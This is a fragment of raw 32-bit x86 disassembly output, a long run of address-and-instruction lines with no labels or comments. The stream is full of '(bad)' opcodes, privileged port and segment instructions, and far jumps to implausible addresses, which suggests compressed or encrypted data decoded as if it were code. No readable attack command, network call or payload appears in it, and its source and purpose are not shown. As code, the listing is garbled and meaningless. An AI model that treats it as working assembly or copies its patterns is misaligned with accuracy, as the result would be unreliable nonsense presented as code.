  433bd3:	ror    BYTE PTR [esi+0x69440d8a],cl
  433bd9:	mov    eax,0x4d1b3ec5
  433bde:	inc    ebp
  433bdf:	mov    bh,0xf7
  433be1:	adc    al,0x90
  433be3:	loop   0x433b6c
  433be5:	push   esp
  433be6:	(bad)  
  433be7:	dec    eax
  433be8:	sub    DWORD PTR [esi],ebp
  433bea:	sub    al,0x6c
  433bec:	sub    DWORD PTR [esi+0x73],ebx
  433bef:	adc    BYTE PTR [esi-0x68c536d8],bh
  433bf5:	mov    dh,0x6d
  433bf7:	test   eax,0x582c526
  433bfc:	inc    edi
  433bfd:	es sar al,cl
  433c00:	stos   DWORD PTR es:[edi],eax
  433c01:	sbb    esi,DWORD PTR [esp+edx*1]
  433c04:	je     0x433c71
  433c06:	ret    0x6ef8
  433c09:	pushf  
  433c0a:	add    eax,0x2a2bb542
  433c0f:	sbb    DWORD PTR cs:[esi+0x24],esi
  433c13:	inc    esp
  433c14:	fild   DWORD PTR [edx]
  433c16:	sub    dl,ah
  433c18:	(bad)  
  433c19:	adc    al,0x40
  433c1b:	call   0x4503:0x68cc6d4d
  433c22:	mov    ebx,0x353d143c
  433c27:	out    0xbe,eax
  433c29:	ss inc esp
  433c2b:	mov    ebx,0x959f9d2a
  433c30:	inc    eax
  433c31:	push   cs
  433c32:	and    dl,al
  433c34:	(bad)  
  433c35:	push   edx
  433c36:	aad    0x77
  433c38:	outs   dx,DWORD PTR ds:[esi]
  433c39:	mov    ah,0x67
  433c3b:	cli    
  433c3c:	jmp    0x433c73
  433c3e:	add    ecx,eax
  433c40:	(bad)  
  433c41:	sar    BYTE PTR [ebx],cl
  433c43:	dec    eax
  433c44:	lea    edx,[ebx-0x4e8bf4d4]
  433c4a:	into   
  433c4b:	in     al,0x39
  433c4d:	mov    ah,BYTE PTR [ecx]
  433c4f:	dec    ecx
  433c50:	int3   
  433c51:	test   eax,0xb6051da0
  433c56:	sub    al,0x25
  433c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433c59:	bound  ebp,QWORD PTR [ebx+0x61ebb51d]
  433c5f:	sub    cl,BYTE PTR [eax-0x21]
  433c62:	loopne 0x433c5c
  433c64:	adc    BYTE PTR [ebp-0x65],ch
  433c67:	stos   BYTE PTR es:[edi],al
  433c68:	mov    dl,0xdb
  433c6a:	dec    ebx
  433c6b:	xchg   BYTE PTR [edx+0x3456c136],al
  433c71:	data16 jae 0x433c16
  433c74:	out    dx,al
  433c75:	pop    ss
  433c76:	lock stos BYTE PTR es:[edi],al
  433c78:	and    BYTE PTR [edx+0x77],ah
  433c7b:	fmul   DWORD PTR [edx-0x63]
  433c7e:	jg     0x433c09
  433c80:	sbb    eax,esi
  433c82:	fcom   DWORD PTR [eax+0x6c]
  433c85:	fwait
  433c86:	loope  0x433ce7
  433c88:	xchg   esi,eax
  433c89:	clc    
  433c8a:	ret    0x4a4b
  433c8d:	repnz pop ss
  433c8f:	shl    BYTE PTR [esi],0xaa
  433c92:	mov    ecx,0xa5619529
  433c97:	js     0x433c81
  433c99:	inc    esi
  433c9a:	jne    0x433ce7
  433c9c:	xor    eax,0xa02df8ec
  433ca1:	dec    ebx
  433ca2:	sbb    eax,0xa1675d55
  433ca7:	je     0xeaeef0f4
  433cad:	sub    BYTE PTR [esi+0x3ea5b9f6],dh
  433cb3:	pop    edi
  433cb4:	inc    ecx
  433cb5:	test   al,0xad
  433cb7:	mov    ds:0x5645bc6a,eax
  433cbc:	sbb    eax,0xe16dd0c0
  433cc1:	mov    eax,ds:0xb2646e3c
  433cc6:	imul   esi,DWORD PTR [ebp-0x3],0xffffffad
  433cca:	push   ecx
  433ccb:	rol    DWORD PTR [ebp-0x4c],1
  433cce:	mov    al,0x11
  433cd0:	rcl    ebp,1
  433cd2:	push   ss
  433cd3:	push   0x917ff6ad
  433cd8:	repz mov edx,0x97114d26
  433cde:	or     bh,dl
  433ce0:	or     esi,DWORD PTR [esi-0x24c5f6b6]
  433ce6:	mov    dh,0xd4
  433ce8:	outs   dx,BYTE PTR ds:[esi]
  433ce9:	ror    DWORD PTR [ebx+0x52],1
  433cec:	out    dx,eax
  433ced:	ja     0x433cbd
  433cef:	inc    esp
  433cf0:	mov    al,ds:0x806c44bf
  433cf5:	or     BYTE PTR [ebx],0xc7
  433cf8:	sbb    bl,cl
  433cfa:	and    al,0x31
  433cfc:	leave  
  433cfd:	add    cl,BYTE PTR [ebx]
  433cff:	pop    ebx
  433d00:	add    eax,DWORD PTR [ebp+0x5b351120]
  433d06:	fidiv  DWORD PTR [ebp+0x6e]
  433d09:	sbb    ecx,DWORD PTR [ebx]
  433d0b:	fild   DWORD PTR [eax-0x3b]
  433d0e:	inc    ecx
  433d0f:	jmp    0x433d1b
  433d11:	lea    edx,ds:0xb68eedf5
  433d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433d19:	test   al,0x9e
  433d1b:	dec    esp
  433d1c:	adc    al,0xd6
  433d1e:	push   ebx
  433d1f:	jmp    0xdbb9cafe
  433d24:	dec    ebp
  433d25:	jno    0x433cd4
  433d27:	push   ebp
  433d28:	pushf  
  433d29:	push   cs
  433d2a:	xor    BYTE PTR [ebx-0x79],bl
  433d2d:	cmp    BYTE PTR [ebx+ebx*8],cl
  433d30:	daa    
  433d31:	mov    ds:0x269097bf,al
  433d36:	int    0x91
  433d38:	lods   eax,DWORD PTR ds:[esi]
  433d39:	jl     0x433d96
  433d3b:	xchg   esi,eax
  433d3c:	inc    esp
  433d3d:	jno    0x433d76
  433d3f:	out    dx,eax
  433d40:	mov    ecx,0x7b7ba600
  433d45:	(bad)  
  433d46:	fist   DWORD PTR [ecx]
  433d48:	les    ecx,FWORD PTR [eax+0x11d2d153]
  433d4e:	and    edi,DWORD PTR [ecx]
  433d50:	inc    eax
  433d51:	add    al,0xbb
  433d53:	sub    cl,BYTE PTR [ebp+ecx*2+0x21addb7a]
  433d5a:	fisubr DWORD PTR [edi-0x41]
  433d5d:	add    al,0x82
  433d5f:	and    dh,BYTE PTR [eax+0x62d164bc]
  433d65:	jmp    0xa28440b0
  433d6a:	xchg   esi,eax
  433d6b:	adc    eax,0x54350819
  433d70:	in     al,dx
  433d71:	and    BYTE PTR [eax+0x6f],ah
  433d74:	inc    edx
  433d75:	jae    0x433d65
  433d77:	fimul  DWORD PTR [esp+esi*4+0x4d]
  433d7b:	aam    0xa0
  433d7d:	jo     0x433d68
  433d7f:	mov    dh,cl
  433d81:	push   eax
  433d82:	mov    dh,0x21
  433d84:	push   0xd34b203
  433d89:	outs   dx,DWORD PTR ds:[esi]
  433d8a:	loop   0x433d60
  433d8c:	(bad)  
  433d8d:	fild   DWORD PTR [ebp+edx*8+0x58]
  433d91:	(bad)  
  433d92:	mov    ds:0x9627170d,al
  433d97:	sub    bh,BYTE PTR [edx]
  433d99:	mov    BYTE PTR [edx],bh
  433d9b:	pop    esi
  433d9c:	and    bl,cl
  433d9e:	add    eax,0xc7a01a36
  433da3:	leave  
  433da4:	mov    ds:0x80363337,al
  433da9:	xchg   esi,eax
  433daa:	retf   0xf27a
  433dad:	retf   
  433dae:	push   esp
  433daf:	jl     0x433de8
  433db1:	dec    ebp
  433db2:	inc    ecx
  433db3:	ins    DWORD PTR es:[edi],dx
  433db4:	sub    cl,ah
  433db6:	or     eax,0xd47e12a2
  433dbb:	ret    0xa28e
  433dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433dbf:	(bad)  
  433dc0:	sbb    al,0x5c
  433dc2:	rcr    ebp,0x15
  433dc5:	ins    DWORD PTR es:[edi],dx
  433dc6:	cmp    al,0x4e
  433dc9:	int3   
  433dca:	retf   0xc573
  433dcd:	std    
  433dce:	mov    eax,0x3f3616d4
  433dd3:	sub    bh,0x19
  433dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433dd7:	and    BYTE PTR [ebx-0x6],ch
  433dda:	pop    ebx
  433ddb:	test   DWORD PTR [ebp-0x7],ebp
  433dde:	push   esi
  433ddf:	jns    0x433e13
  433de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433de2:	rol    BYTE PTR [eax],1
  433de4:	nop
  433de5:	clc    
  433de6:	sti    
  433de7:	sbb    ebp,eax
  433de9:	mov    esi,DWORD PTR [esi]
  433deb:	add    eax,0xa39320c0
  433df0:	pop    es
  433df1:	test   al,0xda
  433df3:	(bad)  
  433df4:	inc    ebp
  433df5:	aad    0xad
  433df7:	mov    bh,0xaa
  433df9:	arpl   WORD PTR [esi-0x1c],di
  433dfc:	and    DWORD PTR [ebx+eax*1+0x1b],eax
  433e00:	or     al,ah
  433e02:	pop    eax
  433e03:	pop    cx
  433e05:	or     esp,DWORD PTR [ecx+0x1b]
  433e08:	push   ss
  433e09:	loopne 0x433dae
  433e0b:	in     eax,dx
  433e0c:	test   DWORD PTR [eax-0x3d057a44],eax
  433e12:	jae    0x433e07
  433e14:	mov    dh,0xa7
  433e16:	pop    ebx
  433e17:	fld    TBYTE PTR [ebx*1-0x78385b1d]
  433e1e:	das    
  433e1f:	test   eax,0x11db07e3
  433e24:	adc    esp,ebx
  433e26:	outs   dx,BYTE PTR ds:[esi]
  433e27:	and    DWORD PTR [ecx+0x62f6c3d7],ebp
  433e2d:	in     eax,dx
  433e2e:	and    dl,ah
  433e30:	inc    edx
  433e31:	sub    esp,esp
  433e33:	shr    BYTE PTR [ebp-0x5a],cl
  433e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433e37:	mov    edx,0x3c5475b1
  433e3c:	or     al,0xc2
  433e3e:	fnstsw WORD PTR [eax-0x6d]
  433e41:	cmc    
  433e42:	in     al,dx
  433e43:	or     bh,0xb7
  433e46:	in     al,dx
  433e47:	sbb    al,BYTE PTR [eax]
  433e49:	pusha  
  433e4a:	fistp  DWORD PTR [edx]
  433e4c:	enter  0x5718,0xe6
  433e50:	mov    ch,0x1b
  433e52:	pop    ebp
  433e53:	push   ebp
  433e54:	(bad)  
  433e55:	fiadd  WORD PTR [ebp+0x46]
  433e58:	mov    bh,0x23
  433e5a:	or     bh,BYTE PTR [ebx+0x215cb8a2]
  433e60:	inc    esp
  433e61:	dec    ebp
  433e62:	int    0x94
  433e64:	mov    ch,0x81
  433e66:	test   DWORD PTR ds:0xb28a1dd8,eax
  433e6c:	pop    edi
  433e6d:	jo     0x433e32
  433e6f:	rcr    dl,cl
  433e71:	call   0xf6e1:0xc02e6582
  433e78:	fwait
  433e79:	cmp    bl,BYTE PTR [edx]
  433e7b:	or     BYTE PTR [esi+0x5],ch
  433e7e:	sub    DWORD PTR [ecx-0x4d],esi
  433e81:	push   ecx
  433e82:	push   cs
  433e83:	or     DWORD PTR [ebp+eax*8+0x6d],eax
  433e87:	fild   DWORD PTR [eax+ebx*1+0x59]
  433e8b:	mov    BYTE PTR [edi],ch
  433e8d:	pop    esi
  433e8e:	cwde   
  433e8f:	xlat   BYTE PTR ds:[ebx]
  433e90:	ret    0xd6c2
  433e93:	dec    edx
  433e94:	fnsave [esi-0x7de68f1a]
  433e9a:	stos   DWORD PTR es:[edi],eax
  433e9b:	push   edx
  433e9c:	stos   BYTE PTR es:[edi],al
  433e9d:	fcom   DWORD PTR [ecx+0x51]
  433ea0:	cli    
  433ea1:	jnp    0x433efd
  433ea3:	(bad)  
  433ea4:	xchg   dl,bh
  433ea6:	rol    BYTE PTR [esi],1
  433ea8:	popf   
  433ea9:	push   0x3d
  433eab:	xchg   edx,eax
  433eac:	xor    DWORD PTR [ebx-0x75],edi
  433eaf:	ins    DWORD PTR es:[edi],dx
  433eb0:	mov    ebx,0x1586d075
  433eb5:	add    DWORD PTR [eax+0x14fdedda],ecx
  433ebb:	cmp    eax,0xffffffb5
  433ebe:	and    DWORD PTR [edx],0x74815c6e
  433ec4:	test   al,0x57
  433ec6:	sbb    eax,DWORD PTR [edx]
  433ec8:	push   eax
  433ec9:	fadd   DWORD PTR [ebp*4-0x5dce1ccf]
  433ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ed1:	or     esp,DWORD PTR [esi-0x253aef53]
  433ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433ed8:	in     al,dx
  433ed9:	mov    ebp,0x14104d50
  433ede:	or     dl,BYTE PTR [esi]
  433ee0:	add    eax,0xc536e17e
  433ee5:	push   cs
  433ee6:	mov    al,ds:0xd79e2b9f
  433eeb:	adc    BYTE PTR [edi],al
  433eed:	rcr    DWORD PTR [eax+ebp*8-0x80],cl
  433ef1:	sub    eax,0xc63f99c9
  433ef6:	dec    ecx
  433ef7:	jp     0x433eb7
  433ef9:	and    edx,ebp
  433efb:	(bad)  
  433efc:	adc    DWORD PTR [esi-0x51],ebx
  433eff:	sbb    eax,0x333c91f7
  433f04:	jne    0x433f0a
  433f06:	mov    ah,0x2
  433f08:	fsub   DWORD PTR [ebp-0x6bb23432]
  433f0e:	or     al,0x4
  433f10:	jo     0x433f7f
  433f12:	jbe    0x433f09
  433f14:	mov    bh,0xc6
  433f16:	ret    0x5746
  433f19:	test   al,0x25
  433f1b:	fadd   st,st(0)
  433f1d:	fadd   st(7),st
  433f1f:	iret   
  433f20:	pop    ss
  433f21:	add    al,0x5b
  433f23:	aam    0xf
  433f25:	pushf  
  433f26:	in     eax,dx
  433f27:	je     0x433f22
  433f29:	mov    BYTE PTR [esi+0x45],0xd1
  433f2d:	mov    eax,ds:0xeef64f
  433f32:	jp     0x433f17
  433f34:	pop    ebx
  433f35:	inc    ebx
  433f36:	popa   
  433f37:	arpl   WORD PTR [esi*2+0x3facd7c],cx
  433f3e:	imul   ecx,DWORD PTR cs:[edx],0x13114362
  433f45:	(bad)  
  433f46:	ficom  DWORD PTR [edi+0xa9ad858]
  433f4c:	rol    DWORD PTR [edx+eiz*1-0x63],0x36
  433f51:	and    dl,BYTE PTR [edx]
  433f53:	aas    
  433f54:	pop    ebx
  433f55:	pop    ss
  433f56:	push   esp
  433f57:	or     edx,DWORD PTR [ebx]
  433f59:	gs dec ebp
  433f5b:	or     ah,BYTE PTR [edi-0x69595d98]
  433f61:	outs   dx,DWORD PTR ds:[esi]
  433f62:	sub    eax,esi
  433f64:	in     al,0x0
  433f66:	popf   
  433f67:	and    DWORD PTR [edx-0x723eaeff],0xc7bbb8e
  433f71:	dec    edx
  433f72:	mov    DWORD PTR [esi-0x5b8a9178],esp
  433f78:	mov    al,0x7f
  433f7a:	sbb    ebx,DWORD PTR [edx+edx*2-0x2fbbcbfc]
  433f81:	pop    ds
  433f82:	sub    ebp,DWORD PTR [edx]
  433f84:	or     DWORD PTR [ecx-0x75],ebp
  433f87:	mov    dh,0x2d
  433f89:	push   es
  433f8a:	mov    dl,BYTE PTR [edi]
  433f8c:	or     BYTE PTR [ebp+0x76472a24],ch
  433f92:	push   esp
  433f93:	les    ebp,FWORD PTR [ebp-0x69]
  433f96:	xor    eax,0x72acc7a1
  433f9b:	test   DWORD PTR [ebx+0xdaa8e88],eax
  433fa1:	cs xchg ecx,eax
  433fa3:	sbb    bl,BYTE PTR [ebx+0x4d8e6028]
  433fa9:	rcr    DWORD PTR [ecx],cl
  433fab:	scas   al,BYTE PTR es:[edi]
  433fac:	shr    BYTE PTR [esi+0x7dd23a82],0x8f
  433fb3:	sub    eax,0x7681aa6b
  433fb8:	adc    ebx,ecx
  433fba:	icebp  
  433fbb:	lds    edi,FWORD PTR [esi]
  433fbd:	(bad)  
  433fbe:	(bad)  
  433fbf:	outs   dx,BYTE PTR ds:[esi]
  433fc0:	pop    ebx
  433fc1:	or     edx,ebx
  433fc3:	clc    
  433fc4:	arpl   WORD PTR [ebx-0x1],dx
  433fc7:	lock cmp esi,DWORD PTR [edx]
  433fca:	mov    ds:0x5deda83a,al
  433fcf:	cli    
  433fd0:	lds    esi,FWORD PTR [ebp-0x71]
  433fd3:	fwait
  433fd4:	stos   DWORD PTR es:[edi],eax
  433fd5:	ins    DWORD PTR es:[edi],dx
  433fd6:	add    bl,BYTE PTR [edx+0x5b]
  433fd9:	mov    eax,0xf579d63c
  433fde:	popf   
  433fdf:	pop    eax
  433fe0:	bound  esp,QWORD PTR [ebx+0x6b]
  433fe3:	mov    BYTE PTR [esi],dl
  433fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433fe6:	xchg   DWORD PTR [edx-0x18],ebp
  433fe9:	retf   0x6226
  433fec:	stos   DWORD PTR es:[edi],eax
  433fed:	pop    eax
  433fee:	mov    ecx,esp
  433ff0:	test   BYTE PTR [esi+0x4b015d6e],0xb7
  433ff7:	popf   
  433ff8:	sub    esp,esi
  433ffa:	pop    esi
  433ffb:	mov    edi,0xb1af3c23
  434000:	add    DWORD PTR [edx],ebp
  434002:	outs   dx,BYTE PTR ds:[esi]
  434003:	imul   edi,DWORD PTR [ebp+esi*8-0x5d172d40],0x6e
  43400b:	xor    al,0xa0
  43400d:	inc    edx
  43400e:	mov    bh,BYTE PTR [ebp+0x4b886565]
  434014:	lods   eax,DWORD PTR ds:[esi]
  434015:	or     ax,0x7324
  434019:	ret    0x1ab
  43401c:	inc    edi
  43401d:	shr    BYTE PTR [ebp+0x7ada6e81],1
  434023:	add    eax,0x6b76fc20
  434028:	stos   BYTE PTR es:[edi],al
  434029:	push   0xffffff9a
  43402b:	jbe    0x433fb1
  43402d:	dec    esp
  43402e:	push   esi
  43402f:	pop    ds
  434030:	mov    ebp,ds
  434032:	adc    BYTE PTR [eax-0x4cf4496a],bh
  434038:	aam    0x89
  43403a:	or     bl,bl
  43403c:	ins    DWORD PTR es:[edi],dx
  43403d:	popa   
  43403e:	mov    eax,ds:0x1042c741
  434043:	add    ecx,DWORD PTR [ecx+0x5c6511f5]
  434049:	ins    BYTE PTR es:[edi],dx
  43404a:	pop    ebx
  43404b:	adc    edx,DWORD PTR [ecx]
  43404d:	xor    ecx,ebx
  43404f:	pop    edi
  434050:	ins    DWORD PTR es:[edi],dx
  434051:	imul   esi,ebx,0xffffffd5
  434054:	add    BYTE PTR [eax+0x2e169844],dh
  43405a:	cmp    DWORD PTR [ebp-0x6e477f5a],eax
  434060:	lock jno 0x434056
  434063:	push   0x76aa9abb
  434068:	rcr    DWORD PTR [eax-0x7bf4d37e],1
  43406e:	push   0x110d6c8e
  434073:	frstor [ebx]
  434075:	pop    edi
  434076:	ins    DWORD PTR es:[edi],dx
  434077:	pusha  
  434078:	xor    eax,0xed82de3b
  43407d:	mov    dh,0x2d
  43407f:	popa   
  434080:	jg     0x43409c
  434082:	les    eax,FWORD PTR [esi-0x1476d614]
  434088:	inc    ecx
  434089:	shr    BYTE PTR [ebp-0x654e4fd2],0x6
  434090:	or     DWORD PTR [edx+0x55346d6e],eax
  434096:	pop    ebx
  434097:	mov    cl,0xf8
  434099:	and    eax,0xa170f6e1
  43409e:	ins    DWORD PTR es:[edi],dx
  43409f:	mov    ebx,0x6ee0c41f
  4340a4:	sbb    ah,BYTE PTR [edi-0x7114ad36]
  4340aa:	jmp    0x2d19:0xdcc00342
  4340b1:	sub    eax,0xd45db69a
  4340b6:	lods   eax,DWORD PTR ds:[esi]
  4340b7:	dec    edx
  4340b8:	sbb    DWORD PTR [ebx-0xb],esp
  4340bb:	rcr    BYTE PTR [edx],cl
  4340bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4340be:	push   esi
  4340bf:	sahf   
  4340c0:	(bad)  [esi+0x6902828b]
  4340c6:	or     eax,0xa1aa659
  4340cb:	test   al,0x51
  4340cd:	rcl    BYTE PTR [ecx],1
  4340cf:	xchg   ebp,eax
  4340d0:	sar    DWORD PTR [ecx],1
  4340d2:	outs   dx,BYTE PTR ds:[esi]
  4340d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4340d4:	pop    ebx
  4340d5:	mov    eax,ds:0xdf039838
  4340da:	fcmovbe st,st(7)
  4340dc:	dec    ecx
  4340dd:	inc    esp
  4340de:	fsubr  DWORD PTR [edx]
  4340e0:	sbb    ch,BYTE PTR [eax-0x18d24e35]
  4340e6:	sub    esi,DWORD PTR [edi-0x42a5d653]
  4340ec:	add    eax,0xf2caec66
  4340f1:	pop    esp
  4340f2:	add    esp,eax
  4340f4:	ins    DWORD PTR es:[edi],dx
  4340f5:	popa   
  4340f6:	sti    
  4340f7:	xchg   esp,eax
  4340f8:	shr    BYTE PTR [ebp+0x687cbc5e],cl
  4340fe:	mov    ebx,0x4736f375
  434103:	push   0x74
  434105:	sub    al,0x18
  434107:	mov    WORD PTR [ecx+esi*8-0x4a],ss
  43410b:	mov    dh,0x6d
  43410d:	sub    al,0x9a
  43410f:	iret   
  434110:	daa    
  434111:	mov    ebp,0xbc95b174
  434116:	mov    cl,0x5b
  434118:	pop    ebp
  434119:	pop    eax
  43411a:	fidiv  DWORD PTR [edx]
  43411c:	and    ecx,DWORD PTR [ebp+0x11]
  43411f:	pop    ds
  434120:	xchg   BYTE PTR [ebp+0x71],cl
  434123:	repz retf 
  434125:	jbe    0x434100
  434127:	sub    ch,BYTE PTR [ecx+0x2fa4722b]
  43412d:	xor    ebp,ecx
  43412f:	ins    DWORD PTR es:[edi],dx
  434130:	popa   
  434131:	fist   DWORD PTR [ecx]
  434133:	pop    ss
  434134:	sub    dl,BYTE PTR [eax+0x5]
  434137:	mov    BYTE PTR ss:[edx-0x4e52240b],ah
  43413e:	push   eax
  43413f:	mov    ds:0xadf85d4b,eax
  434144:	mov    ah,0xfb
  434146:	test   edx,esp
  434148:	inc    esi
  434149:	adc    eax,DWORD PTR [eax]
  43414b:	(bad)  
  43414c:	test   BYTE PTR [ebp+0x5513c2a1],0x3b
  434153:	and    bh,cl
  434155:	mov    esi,0xec45cd11
  43415a:	mov    ch,BYTE PTR [eax-0x35]
  43415d:	xchg   edi,eax
  43415e:	adc    eax,0xd821d446
  434163:	sahf   
  434164:	fmul   DWORD PTR [ebx+0x1182aff1]
  43416a:	sbb    eax,0xf6e2c2a3
  43416f:	add    BYTE PTR [edx+0x16],ah
  434172:	xor    BYTE PTR [eax*8+0x5858979f],ch
  434179:	clc    
  43417a:	sbb    dl,dl
  43417c:	pop    eax
  43417d:	xchg   ebp,eax
  43417e:	sub    edi,DWORD PTR [edi+edi*2-0x292bf6c1]
  434185:	inc    eax
  434186:	adc    DWORD PTR [edi+0x36d7ec04],esi
  43418c:	inc    eax
  43418d:	rol    BYTE PTR [esi],0xcc
  434190:	push   esp
  434191:	add    BYTE PTR [edi+0x11b886c6],al
  434197:	sbb    eax,0xc4c1ea9a
  43419c:	callw  0x9676
  4341a0:	les    ebx,FWORD PTR [ecx+0x61]
  4341a3:	aam    0x3c
  4341a5:	inc    esp
  4341a6:	cmp    ch,bh
  4341a8:	sub    eax,0x4826d474
  4341ad:	mov    edi,0x160acf82
  4341b2:	cld    
  4341b3:	mov    eax,ds:0x6ebb6821
  4341b8:	add    dh,BYTE PTR [ecx+0x5c]
  4341bb:	(bad)
  4341be:	dec    edi
  4341bf:	adc    BYTE PTR ss:[ecx+0x63],dh
  4341c3:	jns    0x4341ef
  4341c5:	mov    bl,0xa1
  4341c7:	and    ebx,DWORD PTR [ecx+0x28]
  4341ca:	popa   
  4341cb:	adc    eax,DWORD PTR [ebp-0x21]
  4341ce:	fwait
  4341cf:	sub    al,0x0
  4341d1:	pushf  
  4341d2:	ret    
  4341d3:	and    DWORD PTR [esi],ebp
  4341d5:	mov    ds:0x4ba1f0c1,eax
  4341da:	pop    ebx
  4341db:	and    BYTE PTR [edi],ch
  4341dd:	repnz or BYTE PTR [esi-0x24f14bf5],dh
  4341e4:	jo     0x434203
  4341e6:	push   eax
  4341e7:	arpl   WORD PTR [edi+ebp*8],di
  4341ea:	push   ecx
  4341eb:	test   eax,0x5176db89
  4341f0:	jno    0x43421e
  4341f2:	and    cl,dl
  4341f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341f5:	pushf  
  4341f6:	gs mov bh,0x89
  4341f9:	jbe    0x434266
  4341fb:	or     BYTE PTR [edx-0x2],ah
  4341fe:	(bad)  
  4341ff:	loopne 0x43422d
  434201:	outs   dx,BYTE PTR ds:[esi]
  434202:	cmp    cl,bl
  434204:	mov    cl,0x89
  434206:	mov    al,ds:0x42939fa9
  43420b:	call   0x2601:0xd6e8228a
  434212:	sahf   
  434213:	aam    0xf4
  434215:	int3   
  434216:	sub    eax,0xa6c5553
  43421b:	mov    BYTE PTR [edi],al
  43421d:	pop    ebx
  43421e:	sub    al,0x62
  434220:	push   edi
  434221:	add    DWORD PTR [ebp+eax*1-0x1b],ebp
  434225:	test   DWORD PTR [esi+0x6b6dda90],edx
  43422b:	or     dh,bh
  43422d:	mov    edx,0xfbcbe2ec
  434232:	sbb    eax,0xadd4434d
  434237:	fnsave [esi-0x736d4f26]
  43423d:	pop    eax
  43423e:	add    BYTE PTR es:[ebx-0x197dc53],ah
  434245:	add    DWORD PTR [ebx-0x62c670b6],ebp
  43424b:	(bad)  
  43424c:	div    BYTE PTR [ebp+0x77ac5674]
  434252:	push   ss
  434253:	addr16 or al,0xa7
  434256:	mov    bl,0xbd
  434258:	test   eax,0x70db822b
  43425d:	inc    ecx
  43425e:	ins    BYTE PTR es:[edi],dx
  43425f:	clc    
  434260:	jg     0x434265
  434262:	pop    edi
  434263:	aam    0x2e
  434265:	xor    eax,0x716a3b68
  43426a:	jnp    0x4342d4
  43426c:	sti    
  43426d:	sbb    DWORD PTR [eax+0x2a],0xfb73f20a
  434274:	les    ebp,FWORD PTR [esi-0x13]
  434277:	xchg   edx,eax
  434278:	mov    ds:0xa4ef7b08,eax
  43427d:	cld    
  43427e:	(bad)  
  43427f:	push   cs
  434280:	enter  0xd18c,0xad
  434284:	test   eax,0xb3e5402a
  434289:	jmp    0x434290
  43428b:	ins    DWORD PTR es:[edi],dx
  43428c:	sub    edx,DWORD PTR ds:0xc1156f1d
  434292:	jno    0x434282
  434294:	xchg   ebp,eax
  434295:	mov    ds:0x3fadd51c,al
  43429a:	icebp  
  43429b:	leave  
  43429c:	dec    esi
  43429d:	cmp    eax,0x5ad85d45
  4342a2:	sub    BYTE PTR [ecx-0x27772154],0x62
  4342a9:	mov    eax,0xa635b0b5
  4342ae:	out    0x95,eax
  4342b0:	adc    BYTE PTR [edi+0x223a3483],ch
  4342b6:	fstp   st(2)
  4342b8:	cmp    ch,BYTE PTR [eax-0x5eace17c]
  4342be:	mov    esi,0xbaa77ad
  4342c3:	or     eax,0xb2d91615
  4342c8:	sub    eax,0xa17151d5
  4342cd:	mov    edi,DWORD PTR [ebp+0x1b5af779]
  4342d3:	mov    ah,BYTE PTR [eax-0x2158f2e5]
  4342d9:	jb     0x4342bf
  4342db:	mov    dh,0x68
  4342dd:	popa   
  4342de:	arpl   bx,bp
  4342e0:	lahf   
  4342e1:	xchg   DWORD PTR [ebx],ecx
  4342e3:	loop   0x434351
  4342e5:	jae    0x4342d5
  4342e7:	add    eax,0x36db402b
  4342ec:	mov    ecx,DWORD PTR [ecx]
  4342ee:	ret    0x3e34
  4342f1:	int    0xf2
  4342f3:	add    BYTE PTR [edx+0x13],ah
  4342f6:	je     0x43433b
  4342f8:	mov    DWORD PTR [esi+0x455dca1f],edx
  4342fe:	xchg   edi,eax
  4342ff:	push   0x511c9646
  434304:	push   ebx
  434305:	(bad)  [eax-0x72b44b92]
  43430b:	retf   
  43430c:	test   al,0x6e
  43430e:	sub    al,BYTE PTR [esi]
  434310:	mov    dh,0xc0
  434312:	cli    
  434313:	lahf   
  434314:	xor    eax,0xfe0801aa
  434319:	aad    0x90
  43431b:	in     al,dx
  43431c:	or     ah,BYTE PTR [eax-0x45]
  43431f:	sub    al,0xa1
  434321:	imul   ecx,esi,0xffffff96
  434324:	lds    esi,FWORD PTR [ebp-0x4d]
  434327:	outs   dx,BYTE PTR ds:[esi]
  434328:	pop    ebx
  434329:	push   edi
  43432a:	adc    eax,0x43c2db82
  43432f:	clc    
  434330:	jnp    0x4342f3
  434332:	adc    BYTE PTR [ebx+edi*4],al
  434335:	and    BYTE PTR [esi+0x6c05c008],ch
  43433b:	(bad)  
  43433c:	(bad)  
  43433d:	out    dx,al
  43433e:	pop    esp
  43433f:	inc    edi
  434340:	dec    ebx
  434341:	inc    esp
  434342:	repnz in al,dx
  434344:	or     al,BYTE PTR [eax+0x3e1f030d]
  43434a:	leave  
  43434b:	loopne 0x4343c8
  43434d:	ins    DWORD PTR es:[edi],dx
  43434e:	xor    eax,0x5042d04
  434353:	icebp  
  434354:	mov    ecx,0xdcad2570
  434359:	xor    dh,BYTE PTR [esp+edi*4-0x689756]
  434360:	ds dec ebp
  434362:	mov    edi,0x31c100d0
  434367:	adc    al,0xfe
  434369:	(bad)  
  43436a:	dec    ecx
  43436b:	lds    ecx,FWORD PTR [eax+eax*1]
  43436e:	jge    0x434350
  434370:	or     eax,0x4285d01
  434375:	popa   
  434376:	mov    edi,0xafdac0e5
  43437b:	outs   dx,BYTE PTR ds:[esi]
  43437c:	or     ebp,DWORD PTR [edi-0x1da640b7]
  434382:	push   esi
  434383:	fwait
  434384:	jb     0x4343be
  434386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434387:	lods   eax,DWORD PTR ds:[esi]
  434388:	fst    QWORD PTR [esi-0x39734a1d]
  43438e:	dec    ecx
  43438f:	inc    BYTE PTR [esi+0x5b8ad7dc]
  434395:	dec    ebp
  434396:	les    ebp,FWORD PTR [ebx+0x25bd7a0d]
  43439c:	jmp    0xe70e:0xd0036da7
  4343a3:	mov    ecx,0xe90f3bb8
  4343a8:	push   esi
  4343a9:	or     eax,DWORD PTR [ebp+eiz*2-0x7f]
  4343ad:	xchg   edi,eax
